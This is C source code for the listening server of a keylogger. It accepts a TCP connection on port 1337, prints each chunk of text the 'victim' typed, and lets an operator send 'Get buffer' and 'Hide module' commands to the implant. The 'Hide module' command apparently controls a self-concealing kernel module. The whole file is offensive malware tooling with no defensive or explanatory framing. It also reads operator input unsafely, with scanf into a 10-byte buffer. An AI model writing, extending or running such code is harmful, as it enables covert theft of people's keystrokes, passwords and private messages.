#include <sys/types.h>
#include <unistd.h>          
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>     
#include <sys/socket.h>
#include <sys/un.h>
#include <netinet/in.h>
#include <pthread.h>

#define SIM_LENGTH 10 
#define PORT 1337 
#define GET_BUFFER "1"
#define HIDE_MODULE "2"

static int* sock_num;
static pthread_t io_thread;
static int connect_sock; 

void clean_up(int cond, int *sock)
{ 
  printf("Exiting now.\n");
  close(*sock);
  pthread_cancel(io_thread);
  exit(cond);
} 

void handle_sigint(int signal){
    clean_up(1, sock_num);
}

void* input_handler(void* data){
  printf("Thread running\n");
  char input[10];

  for(;;){
    bzero(input,10);
    printf("[Keylogger] >> ");
    scanf("%s", &input);
    printf("%s\n",input);

    if (strncmp(input, GET_BUFFER, 1) == 0){
      write(connect_sock, GET_BUFFER, 1);
    }

    else if (strncmp(input, HIDE_MODULE, 1) == 0)
      write(connect_sock, HIDE_MODULE, 1);
  }
  
}

int main(void)
{ 
  int sock; 
  struct sockaddr_in serv_name; 
  int len; 
  int count;
  char buffer[1024];
  
  if (signal(SIGINT, handle_sigint) == SIG_ERR)
        printf("Can't catch SIGINT\n");

  sock = socket(PF_INET, SOCK_STREAM, 0);  
  if (sock < 0)
    { perror ("Error opening channel");
      clean_up(1, &sock);
    }

  sock_num = &sock;
  
  bzero(&serv_name, sizeof(serv_name)); 
  serv_name.sin_family = PF_INET;                                   
  serv_name.sin_port = htons(PORT); 
  serv_name.sin_addr.s_addr = INADDR_ANY;

  if (bind(sock, (struct sockaddr *)&serv_name, sizeof(serv_name)) < 0)
    {
      perror ("Error naming channel");
      clean_up(1, &sock);
    }
      
  printf("Server listening...\n\n[1] Get buffer\n[2] Hide module\n");
  listen(sock, 1); 

  len = sizeof(serv_name);
  connect_sock = accept(sock, (struct sockaddr *)&serv_name, &len);


  pthread_create(&io_thread, NULL, input_handler, NULL);

  for(;;){
    bzero(buffer, 1024);
    if (read(connect_sock, buffer, sizeof(buffer)) <= 0)
      break;

    printf("[Victim typed]: %s\n", buffer);
  }

  close(connect_sock); 
  clean_up(0, &sock); 

}
